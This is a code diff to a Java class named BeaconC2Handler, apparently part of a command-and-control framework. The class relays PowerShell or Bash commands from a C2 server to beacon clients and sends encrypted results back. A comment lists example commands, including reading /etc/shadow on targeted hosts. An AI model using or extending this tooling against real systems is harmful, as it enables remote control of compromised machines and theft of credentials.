@@ -3,8 +3,6 @@ package Servers.Beacon;
 import java.io.IOException;
 import java.net.NoRouteToHostException;
 import java.net.Socket;
-import java.util.ArrayList;
-import java.util.HashMap;
 import java.security.SecureRandom;
 
 import Servers.Duplexer;
@@ -70,34 +68,12 @@ public class BeaconC2Handler implements Runnable{
      * Function meant to be used by the Long Range Beacon Server
      * to send data back to the C2 Server when it's requested
      * 
-     * @param Data The Data to be sent back to the C2 Server
+     * @param data The Data to be sent back to the C2 Server
      */
-    protected void sendDataToC2Server(String Data){
+    protected void sendDataToC2Server(String data){
         synchronized(sendLock){
-            C2Server.send(aes.encrypt(Data), true);
+            C2Server.send(aes.encrypt(data), true);
         }
-    }
-
-    protected void sendResponsesToC2Server(String scope){
-        StringBuilder responseToRequest = new StringBuilder();
-        HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
-        for (String IP : clientResponses.keySet()) {
-            responseToRequest.append("Client IP: ").append(IP).append("\n");
-            responseToRequest.append("Responses:\n");
-
-            ArrayList<String> responses = clientResponses.get(IP);
-            for (int i = 0; i < responses.size(); i++) {
-                String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
-                
-                // Only add if the line is not empty
-                if (!line.isEmpty()) {
-                    responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
-                }
-            }
-            responseToRequest.append("\n"); // Separate each client's response block with a newline
-        }
-        String finalResponseToRequest = responseToRequest.toString() + "END_OF_OUTPUT";
-        C2Server.send(aes.encrypt(finalResponseToRequest), true);
     }
 
     @Override
@@ -113,15 +89,13 @@ public class BeaconC2Handler implements Runnable{
         } else {
             /**
              * Commands from the C2 Server are organized by two attributes
-             * Type - Command, Request, Status
+             * Type - Command
              * Scope - Windows, Linux, or IPv4 Address
              * 
              * Examples
              * 
              * Command Windows_Get-LocalUser
-             * Request Linux_
-             * Request 192.168.1.5_
-             * Scope All
+             * Status All
              * Command Linux_whoami
              * Command 10.0.10.x_cat /etc/shadow
              */
@@ -203,20 +177,6 @@ public class BeaconC2Handler implements Runnable{
                     if(verb.equals("Command")){
                         // If a message is a command, it will be in the format "Command [Scope - Windows, Linux, or IPv4 Address]_[Powershell/Bash command to be run]"
                         beaconServer.distributeCommands(scope, commands);
-                    }
-                    // If a message is a request, it will be in the format "Request [Scope - Windows, Linux, or IPv4 Address]_"
-                    else if(verb.equals("Request")){
-                        sendResponsesToC2Server(scope);
-                    }
-                    // If a message is a Status check, it will be in the format "Status All_"
-                    else if(verb.equals("Status")){
-                        String responseToRequest;
-                        responseToRequest = beaconServer.getClientStatus();
-                        C2Server.send(aes.encrypt(responseToRequest), true);
-                    }
-                    // Shell is essentially the same thing as sending commands, however we want to send responses back immediately
-                    else if (verb.equals("Shell")){
-                        beaconServer.getShellResponse(scope, commands);
                     }
                 }
             } catch (NullPointerException e){
